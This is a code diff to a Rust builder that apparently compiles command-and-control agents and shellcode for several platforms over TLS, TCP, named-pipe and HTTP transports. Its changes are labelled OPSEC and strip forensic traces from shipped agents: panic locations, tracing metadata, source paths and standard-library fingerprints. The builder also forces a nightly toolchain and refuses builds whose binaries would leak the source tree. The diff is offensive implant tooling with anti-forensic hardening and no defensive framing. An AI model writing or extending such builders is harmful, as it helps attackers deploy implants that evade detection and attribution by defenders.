@@ -1,4 +1,3 @@
-// src/bin/builder.rs
 use clap::{ArgAction, Parser, ValueEnum};
 use std::process::Command;
 use std::fs;
@@ -106,6 +105,13 @@ struct Cli {
     /// On-disk encoding for the generated shellcode.
     #[arg(long, value_enum, default_value_t = ScOutput::Bin)]
     sc_output: ScOutput,
+
+    /// Permit building on a STABLE toolchain. Without this flag the builder
+    /// REFUSES to produce an agent on stable Rust, because stable cannot strip
+    /// panic file:line metadata and the resulting binary leaks the entire
+    /// source tree and all Rust fingerprints. Only use for throwaway dev builds.
+    #[arg(long, default_value_t = false)]
+    allow_stable_leak: bool,
 }
 
 /// Parse a u32 given as decimal or 0x-prefixed hex (for --sc-hash).
@@ -119,7 +125,7 @@ fn parse_u32_auto(s: &str) -> Result<u32, String> {
 }
 
 #[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
-enum Platform { Linux, Windows, Macos }
+enum Platform { Linux, LinuxMusl, Windows, Macos }
 
 #[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
 enum Transport { Tls, TcpPlain, NamedPipe, Http, Https }
@@ -463,7 +469,8 @@ fn main() -> Result<()> {
 
     // ── Compile ───────────────────────────────────────────────────────
     let (target, ext) = match cli.platform {
-        Platform::Linux   => ("x86_64-unknown-linux-gnu", ""),
+        Platform::Linux     => ("x86_64-unknown-linux-gnu", ""),
+        Platform::LinuxMusl => ("x86_64-unknown-linux-musl", ""),
         Platform::Windows => ("x86_64-pc-windows-gnu", ".exe"),
         Platform::Macos   => {
             println!("\n[!] WARNING: macOS cross-compilation is not supported in the Docker image.");
@@ -527,6 +534,15 @@ fn main() -> Result<()> {
        .current_dir(&project_root)
        .env("C2_BUILD_CONFIG", &build_env_json);
 
+    // OPSEC: in shipped (non-debug) agents, compile out ALL tracing callsite
+    // metadata: every tracing event macro (ours and dependencies', e.g. h2)
+    // expands to a no-op with no static file:line strings in the binary.
+    // Debug builds keep full logging (callsites + subscriber).
+    if !cli.debug {
+        cmd.args(["--features", "agent-quiet"]);
+        println!("[+] OPSEC: tracing callsites suppressed (agent-quiet / release_max_level_off)");
+    }
+
     // Propagate CARGO_HOME and RUSTUP_HOME
     if let Ok(ch) = std::env::var("CARGO_HOME") {
         cmd.env("CARGO_HOME", &ch);
@@ -550,7 +566,27 @@ fn main() -> Result<()> {
     // WILL leak into the binary.
     let cargo_home = std::env::var("CARGO_HOME").unwrap_or_else(|_| "/usr/local/cargo".to_string());
 
-    // Toolchain detection: rustc lives next to cargo; fall back to PATH.
+    // Toolchain detection: probe via `rustup run nightly rustc --version`,
+    // which BYPASSES RUSTUP_TOOLCHAIN and rust-toolchain.toml resolution
+    // entirely. The bare cargo/rustc shims resolve whatever toolchain the
+    // environment pins - official rust:* images set ENV RUSTUP_TOOLCHAIN=<stable>
+    // (priority 2), which silently outranks the project's rust-toolchain.toml
+    // (priority 3) - so a shim-based probe would report stable even when
+    // nightly is installed. `rustup run nightly` selects the toolchain
+    // explicitly (priority 1 equivalent) and is environment-independent.
+    let rustup_bin = find_rustup();
+    let nightly_version = Command::new(&rustup_bin)
+        .args(["run", "nightly", "rustc", "--version"])
+        .output()
+        .ok()
+        .filter(|o| o.status.success())
+        .map(|o| String::from_utf8_lossy(&o.stdout).into_owned())
+        .unwrap_or_default();
+    let mut is_nightly = nightly_version.contains("nightly");
+
+    // Shim resolution (what `cargo`/`rustc` would actually run under this
+    // environment) is probed ONLY for the stable-toolchain warning message
+    // below - never for the is_nightly decision.
     let rustc_bin = cargo_bin.with_file_name("rustc");
     let rustc_version = Command::new(&rustc_bin)
         .arg("--version")
@@ -558,9 +594,64 @@ fn main() -> Result<()> {
         .or_else(|_| Command::new("rustc").arg("--version").output())
         .map(|o| String::from_utf8_lossy(&o.stdout).into_owned())
         .unwrap_or_default();
-    let is_nightly = rustc_version.contains("nightly");
+
+    // Self-provision: when nightly is missing, try to install it via rustup
+    // instead of failing outright. This path mainly helps non-Docker users -
+    // the Dockerfile pre-installs nightly + rust-src at image level - and it
+    // only fails if the install itself fails (e.g. offline build). The
+    // re-probe goes through `rustup run nightly` again, NOT the bare rustc
+    // shim: the shim still answers stable while RUSTUP_TOOLCHAIN=<stable> is
+    // set (the old re-check re-ran the shim in the same environment and so
+    // concluded "stable" even after a successful nightly install).
+    if !is_nightly {
+        println!("[*] Stable toolchain detected - attempting auto-install of nightly via rustup...");
+        let tc_ok = Command::new(&rustup_bin)
+            .args(["toolchain", "install", "nightly", "--profile", "minimal"])
+            .status()
+            .map(|s| s.success())
+            .unwrap_or(false);
+        if tc_ok {
+            let _ = Command::new(&rustup_bin)
+                .args(["component", "add", "rust-src", "--toolchain", "nightly"])
+                .status();
+            let v2 = Command::new(&rustup_bin)
+                .args(["run", "nightly", "rustc", "--version"])
+                .output()
+                .ok()
+                .filter(|o| o.status.success())
+                .map(|o| String::from_utf8_lossy(&o.stdout).into_owned())
+                .unwrap_or_default();
+            is_nightly = v2.contains("nightly");
+            if is_nightly {
+                println!("[+] Nightly toolchain auto-installed successfully.");
+            }
+        }
+        if !is_nightly {
+            println!("[!] Nightly auto-install failed (offline? no rustup?).");
+        }
+    }
+
+    // The spawned cargo is a rustup SHIM: under RUSTUP_TOOLCHAIN=<stable>
+    // (set by official rust:* images) it would resolve stable and reject the
+    // nightly-only -Z flags (-Ztrim-paths, -Zbuild-std) even though detection
+    // above saw nightly. Pin the toolchain explicitly for the child.
+    //
+    // cmd.env_remove("RUSTUP_TOOLCHAIN") alone is NOT sufficient: removal only
+    // drops the child back to IMPLICIT resolution (rust-toolchain.toml, then
+    // directory overrides, then rustup's default toolchain - often stable).
+    // That fallback breaks whenever rust-toolchain.toml is unreachable from
+    // the build CWD, a `rustup override` pins the directory, or the default
+    // toolchain is stable. The explicit pin states intent and wins at shim
+    // priority 2 regardless of what the parent/image environment contains.
+    if is_nightly {
+        cmd.env("RUSTUP_TOOLCHAIN", "nightly");
+    }
 
     if is_nightly {
+        // -Ztrim-paths is a cargo option (not rustc): rewrites own-crate paths
+        // to <crate>/..., registry and sysroot paths to neutral forms. Always
+        // safe on nightly, independent of rust-src.
+        cmd.arg("-Ztrim-paths");
         // Rebuild the standard library from source with the SAME OPSEC flags.
         //
         // Without this, the *prebuilt* core/std still fingerprint the binary
@@ -577,18 +668,23 @@ fn main() -> Result<()> {
         // panic_immediate_abort turns every std panic into an immediate abort
         // with NO message formatting machinery, so those strings are never
         // materialized in the binary. Requires the rust-src component.
-        let rustup_bin = find_rustup();
+        // Query the NIGHTLY toolchain explicitly: a bare
+        // `component list --installed` inspects the env-resolved (stable)
+        // toolchain under RUSTUP_TOOLCHAIN=<stable> and would miss the
+        // rust-src component installed for nightly above.
         let rust_src_ok = Command::new(&rustup_bin)
-            .args(["component", "list", "--installed"])
+            .args(["component", "list", "--toolchain", "nightly", "--installed"])
             .output()
             .map(|o| String::from_utf8_lossy(&o.stdout).contains("rust-src"))
             .unwrap_or(false);
         if rust_src_ok {
             println!("[+] OPSEC: rebuilding std with panic_immediate_abort (Rust fingerprints removed)");
-            cmd.args([
-                "-Zbuild-std=std,panic_abort",
-                "-Zbuild-std-features=panic_immediate_abort",
-            ]);
+            // NOTE: -Zbuild-std is a CARGO option (must be a cargo arg, NOT
+            // in RUSTFLAGS — rustc rejects it). panic_immediate_abort is
+            // enabled as a panic STRATEGY via -Cpanic=immediate-abort (in
+            // RUSTFLAGS below); the old std-feature form was removed from
+            // newer nightlies.
+            cmd.arg("-Zbuild-std=std,panic_abort");
         } else {
             println!("[!] ============================================================");
             println!("[!] WARNING: rust-src component not installed.");
@@ -601,13 +697,28 @@ fn main() -> Result<()> {
 
     let opsec_flags = if is_nightly {
         println!("[+] OPSEC: panic locations stripped (nightly)");
-        "-Zlocation-detail=none -Ztrim-paths".to_string()
+        // -Zunstable-options unlocks -Cpanic=immediate-abort: every panic
+        // (including inside std, which -Zbuild-std recompiles) becomes an
+        // immediate abort with NO message formatting machinery - std panic
+        // strings (called `Option::unwrap()`..., thread '...' panicked at,
+        // RUST_BACKTRACE) are never materialized in the binary.
+        "-Zlocation-detail=none -Zunstable-options -Cpanic=immediate-abort".to_string()
     } else {
         println!("[!] ============================================================");
         println!("[!] WARNING: stable toolchain detected ('{}').", rustc_version.trim());
         println!("[!] Panic file:line strings WILL leak into the agent binary.");
         println!("[!] Use a nightly toolchain for -Zlocation-detail=none -Ztrim-paths.");
         println!("[!] ============================================================");
+        if !cli.allow_stable_leak {
+            eprintln!("[-] REFUSING to build a leaky agent on a stable toolchain.");
+            eprintln!("[-] Install nightly + rust-src:");
+            eprintln!("[-]   rustup toolchain install nightly --profile minimal");
+            eprintln!("[-]   rustup component add rust-src --toolchain nightly");
+            eprintln!("[-] (in Docker: add both lines to the image AND unset RUSTUP_TOOLCHAIN)");
+            eprintln!("[-] Or pass --allow-stable-leak for a throwaway dev build.");
+            anyhow::bail!("stable toolchain would produce a fingerprinted binary");
+        }
+        println!("[!] --allow-stable-leak set: proceeding with a KNOWN-LEAKY build.");
         format!(
             "--remap-path-prefix {}=/src --remap-path-prefix {}=/cargo",
             project_root.display(), cargo_home
@@ -647,6 +758,7 @@ fn main() -> Result<()> {
     };
     cmd.env("RUSTFLAGS", rustflags);
 
+    println!("[*] cargo invocation: {:?} {:?}", cmd.get_program(), cmd.get_args());
     let status = cmd.status().context(
         "Failed to spawn cargo. Verify that cargo is installed and accessible."
     )?;
